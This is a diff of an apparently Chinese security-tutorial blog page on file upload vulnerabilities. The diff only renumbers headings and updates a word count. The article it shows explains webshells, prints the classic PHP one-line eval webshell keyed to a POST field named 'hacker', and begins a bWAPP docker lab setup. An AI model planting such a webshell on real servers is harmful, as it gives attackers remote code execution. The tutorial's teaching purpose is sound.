@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    442 字
+                    446 字
                   </span>
                 
 
@@ -188,8 +188,8 @@
               </p>
             
             <article class="markdown-body">
-              <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="漏洞原理：Webshell"><a href="#漏洞原理：Webshell" class="headerlink" title="漏洞原理：Webshell"></a>漏洞原理：Webshell</h2><p>webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限。<br>webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。<br>关键函数：以php为例，eval（），执行用户输入的函数。</p>
-<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h3 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马"></a>php一句话木马</h3><pre><code class="hljs plain">&lt;?php @eval($_POST[&#39;hacker&#39;]);?&gt;</code></pre>
+              <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="1、漏洞原理：Webshell"><a href="#1、漏洞原理：Webshell" class="headerlink" title="1、漏洞原理：Webshell"></a>1、漏洞原理：Webshell</h2><p>webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限。<br>webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。<br>关键函数：以php为例，eval（），执行用户输入的函数。</p>
+<h2 id="2、一句话木马"><a href="#2、一句话木马" class="headerlink" title="2、一句话木马"></a>2、一句话木马</h2><h3 id="2-1-php一句话木马"><a href="#2-1-php一句话木马" class="headerlink" title="2.1 php一句话木马"></a>2.1 php一句话木马</h3><pre><code class="hljs plain">&lt;?php @eval($_POST[&#39;hacker&#39;]);?&gt;</code></pre>
 <p>获取post请求中hacker字段的值，并将该值转换为php代码执行；</p>
 <h2 id="实战模拟"><a href="#实战模拟" class="headerlink" title="实战模拟"></a>实战模拟</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre><code class="hljs plain"># 第一次启动
 docker pull registry.cn-shanghai.aliyuncs.com&#x2F;yhskc&#x2F;bwapp
